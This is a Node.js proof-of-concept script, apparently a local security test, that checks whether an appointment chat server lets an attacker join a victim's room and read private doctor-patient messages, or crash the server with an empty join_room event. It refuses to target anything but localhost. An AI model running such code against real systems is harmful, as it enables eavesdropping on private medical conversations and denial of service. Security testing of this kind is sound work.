const { io } = require("socket.io-client");

const SERVER_URL = process.env.SERVER_URL || "http://localhost:1111";
const TOKEN = process.env.ATTACKER_TOKEN;
const APPOINTMENT_ID = process.env.APPOINTMENT_ID;
const MODE = process.argv[2] || "join";
const LISTEN_SECONDS = Number(process.env.LISTEN_SECONDS || 45);

if (!/^https?:\/\/(localhost|127\.0\.0\.1)(:\d+)?$/.test(SERVER_URL)) {
  console.error("Refusing to run against a non-local server.");
  process.exit(1);
}
if (!TOKEN || (MODE === "join" && !APPOINTMENT_ID)) {
  console.error("Set ATTACKER_TOKEN and APPOINTMENT_ID first.");
  process.exit(1);
}

const line = () => console.log("-".repeat(64));
const socket = io(SERVER_URL, {
  auth: { token: TOKEN },
  transports: ["websocket"],
  reconnection: false,
});

socket.on("connect_error", (e) => {
  console.log(`[x] connect_error: ${e.message}`);
  process.exit(0);
});

socket.on("connect", () => {
  line();
  console.log(`[+] Attacker socket connected (${socket.id}) to ${SERVER_URL}`);

  if (MODE === "crash") {
    console.log("[*] Sending join_room with NO payload ...");
    socket.emit("join_room");
    setTimeout(() => {
      if (socket.connected) {
        console.log(
          "[OK] BLOCKED/HANDLED - server is still up (socket still connected)",
        );
      }
      process.exit(0);
    }, 3000);
    return;
  }

  console.log(
    `[*] Trying to join victim's appointment room: ${APPOINTMENT_ID}`,
  );
  socket.emit("join_room", { appointmentId: APPOINTMENT_ID });
});

socket.on("disconnect", (reason) => {
  if (MODE === "crash") {
    console.log(
      `[!!] VULNERABLE - server connection dropped (${reason}). Check the server terminal: the Node process crashed.`,
    );
    process.exit(0);
  }
});

socket.on("room_joined", ({ appointmentId }) => {
  console.log(
    `[!!] VULNERABLE - server let attacker join room ${appointmentId}`,
  );
  console.log(
    `[*] Listening ${LISTEN_SECONDS}s. Send a chat message as the victim/doctor now ...`,
  );
  line();
  socket.emit("typing", { appointmentId, isTyping: true });
  setTimeout(() => process.exit(0), LISTEN_SECONDS * 1000);
});

socket.on("new_message", (msg) => {
  console.log("[!!] INTERCEPTED victim message:");
  console.log(
    `     from=${msg.senderRole} text="${msg.message}" at=${msg.createdAt || ""}`,
  );
});

socket.on("room_error", (err) => {
  console.log(`[OK] BLOCKED - room_error: ${err.message}`);
  line();
  setTimeout(() => process.exit(0), 1500);
});
